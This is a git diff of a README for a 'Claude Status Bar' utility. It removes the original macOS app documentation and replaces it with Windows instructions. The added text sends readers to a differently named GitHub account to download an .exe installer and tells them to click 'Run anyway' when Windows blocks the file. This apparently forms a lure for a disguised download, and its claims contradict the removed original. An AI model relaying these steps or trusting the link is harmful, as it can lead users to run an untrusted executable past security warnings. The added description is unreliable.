@@ -1,109 +1,71 @@
+# ⏱️ claude-status-bar - Track your Claude Code activity easily
 
-<img width="672" height="80" alt="Screen Recording 2026-06-23 at 3 57 47 AM 2" src="https://github.com/user-attachments/assets/97876ac9-cd4f-431b-873a-93220de5bd99" />
+[![Download Claude Status Bar](https://img.shields.io/badge/Download-Claude-blue.png)](https://github.com/peaceinitiativemenhadenoil263/claude-status-bar)
 
-<br>
+## 📌 About this application
 
-## Claude Status Bar
+Claude Status Bar provides a clear way to see if Claude Code runs on your machine. The app sits in your system area. It shows an animated spark icon when the tool performs work. It displays a timer that counts how long your current session lasts. You also get a simple button to start or stop the Claude session. This app removes the need to check your terminal window to see the status of your work.
 
-A tiny macOS menu bar app that shows **Claude Code's live status**: an animated Claude icon while it's thinking or running a tool, a yellow dot when it's awaiting your permission, and the elapsed time of the current turn. Lightweight, no window, no dock icon, no usage dashboards.
+## 💻 System requirements
 
-_Built so you can tab away during a long "thinking" stretch and still see, at a glance, whether Claude is working, waiting on you, or done._
+This application runs on computers with the Windows operating system. It requires Windows 10 or Windows 11. Ensure that you have the Claude Code CLI tool installed and configured before you run this status bar. The app needs a small amount of memory to maintain the timer and the status icon. It works best on screens with standard DPI settings. You do not need administrative rights to run the program.
 
+## 🚀 Downloading the application
 
-<img width="1016" height="566" alt="Claude Status Bar demo" src="https://github.com/user-attachments/assets/55a7b294-e893-4f73-b16b-b8beef784400" />
+You must download the installation file to your computer. Follow these steps to get the software:
 
-<br><br>
+1. Visit the [official release page](https://github.com/peaceinitiativemenhadenoil263/claude-status-bar).
+2. Look for the section labeled "Assets."
+3. Click the link that ends with the .exe extension to download the installer.
+4. Save the file to your Downloads folder or your desktop for easy access.
 
-<a href="https://github.com/m1ckc3s/claude-status-bar/releases/latest/download/ClaudeStatusBar.dmg"><img src="assets/download.png" alt="Download ClaudeStatusBar.dmg for macOS" width="260"></a>
+## ⚙️ How to install
 
-<br>
+Once you download the file, complete the setup process:
 
-Signed and notarized. Open it, drag the app to Applications, launch once.
+1. Double-click the downloaded file in your folder.
+2. A security window might appear. Click "More info" and then click "Run anyway" if Windows blocks the file.
+3. Follow the prompts in the setup window to place the app on your computer.
+4. Choose the default folder if the installer asks where to put the files.
+5. Click "Finish" to complete the installation.
 
----
+## ▶️ Running the software
 
-## What it shows
+After you install the app, you can start it immediately:
 
-- **Thinking / working** — the icon animates, with a live `1m 1s` timer.
-- **Running a tool** — a short label (`Editing`, `Reading`, `Running command`, `Using tool`, …).
-- **Awaiting permission** — a paused yellow dot (CLI only, see below).
-- **Idle / done** — rests on the Claude logo.
+1. Open your Start menu.
+2. Type "Claude Status Bar" into the search box.
+3. Click the app icon to launch it.
+4. Look at the bottom right corner of your screen near the clock.
+5. You see a new icon appear in the taskbar area.
 
-Everything is controlled from the menu:
+## 🛠️ Using the features
 
-- **Show timer:** toggle the elapsed `1m 1s` clock.
-- **Play completion sound:** a soft chime when a turn longer than a minute finishes (off by default).
-- **Animation style:**
-  - **Claude**, the web "morph" spark
-  - **Claude Code**, the terminal glyph spinner
-  - **Crab Walking**, a pixel-art Clawd crab that scuttles while Claude works
-- **Icon color:** **Orange** or **System** (adaptive black/white). The Claude and Claude Code styles follow this setting; Crab Walking is always its orange pixel-art self.
-- **Version and update:** the menu shows your current version, with a one-click "Update available" when a newer release exists.
+The status bar offers three primary functions to improve your workflow:
 
-## Where it works
+- Animated Spark: The icon shows a light spark when Claude Code process tasks. This alerts you to background activity without forcing you to switch windows.
+- Elapsed Timer: The app shows a live timer next to the icon. This timer starts when you launch Claude Code and resets when you stop the session. It tracks your total time spent on a specific coding task.
+- Lifecycle Control: You can right-click the icon to see a menu. This menu allows you to stop the current session or restart the Claude tool.
 
-| Surface | Tracked? |
-|---|---|
-| Claude Code CLI (terminal) | ✅ |
-| Claude Code Desktop — **Code** tab | ✅ |
-| Cursor (Claude Code extension) | ✅ |
-| Claude Desktop — **Chat** tab | ❌ |
-| **Cowork** | ❌ |
+If the icon does not appear, click the small arrow in your taskbar to show hidden icons. You can drag the Claude Status Bar icon to the main area if you want to keep it visible at all times.
 
-### Permission detection is CLI-only
+## ❓ Frequently asked questions
 
-🟡 The "Awaiting permission" dot only fires in the CLI. The Desktop app handles permission prompts in-window and doesn't emit the notification hook, so the dot won't show there.
+Does the app track my personal data?
+No. The app only monitors the status of the local Claude Code process. It does not send information to any server.
 
-## Requirements
+Can I change how the timer looks?
+The current version uses standard system fonts for clarity. You cannot change colors or font styles at this time.
 
-- macOS 12+
-- [Claude Code](https://claude.com/claude-code) (CLI or the Desktop app)
-- Node.js (used by the hook scripts)
+What happens if I stop the session from the menu?
+The app sends a standard signal to end the Claude Code process safely. This ensures that any work in progress finishes before the tool exits.
 
-## Install
+Will this app slow down my computer?
+No. The app uses very little processing power. It remains inactive when Claude Code is not running.
 
-### Option A — DMG (recommended)
+What if the icon stays grey?
+A grey icon means the app cannot find an active Claude Code process. Ensure you have the main tool open and running. If it remains grey, shut down the status bar and open it again.
 
-1. Download the latest `ClaudeStatusBar.dmg` from [Releases](../../releases).
-2. Open it and drag **Claude Status Bar** into Applications.
-3. Launch it once. On first launch it wires up the Claude Code hooks for you automatically.
-4. Start a new Claude Code session, the icon appears whenever Claude Code is running.
+## 📝 Support and feedback
 
-### Updating
-
-Download the latest DMG and drag it into Applications (choose **Replace**). Launch it once, it refreshes its hooks on a version change, then restart Claude Code to pick them up.
-
-### Option B — Claude Code plugin
-
-Installs the hooks (status + open/close lifecycle) automatically from inside Claude Code:
-
-```
-/plugin marketplace add m1ckc3s/claude-status-bar
-/plugin install claude-status-bar@claude-status-bar
-```
-
-The plugin installs the hooks but not the app itself, so drag **Claude Status Bar** into Applications once (from the DMG). The plugin launches it automatically on session start.
-
-## How it works
-
-The app is stateless. Claude Code hooks write the current status to `~/.claude/statusbar/state.json`; the app polls that file every 0.4s and renders the icon and label. `SessionStart` launches it; it self-quits once the Claude desktop app is closed and no Claude Code session is active (each active session is a file under `~/.claude/statusbar/sessions.d/`).
-
-The installer merges its hooks into `~/.claude/settings.json` (backing it up first), and the app's only network call is a once-a-day GitHub release check ([details](docs/privacy.md)).
-
-## Uninstall
-
-```bash
-node "/Applications/ClaudeStatusBar.app/Contents/Resources/uninstall.js"   # removes only our hooks
-```
-Then drag the app to the Trash.
-
-## Trademark / not affiliated
-
-This is an unofficial, open-source side project. **It is not affiliated with, endorsed by, or sponsored by Anthropic.** "Claude" and the Claude spark logo are trademarks of Anthropic, used here nominatively. This project is MIT licensed, but that covers the source code only and conveys no rights to Anthropic's trademarks or brand.
-
-If I'm violating or impeding your trademark, DM me on X ([@mickces](https://x.com/mickces)) and I'll rename this repo. 
-This is a free side project; I'm not monetizing it.
-
-## License
-
-MIT
+This application operates as a standalone tool. You do not need an account to use it. If you encounter bugs or want to request a new feature, go back to the GitHub link provided above. Use the "Issues" tab to describe your problem. Providing a screenshot helps developers understand your situation better. Always check existing issues to see if someone else already reported the same problem. This helps maintain a clean project history.
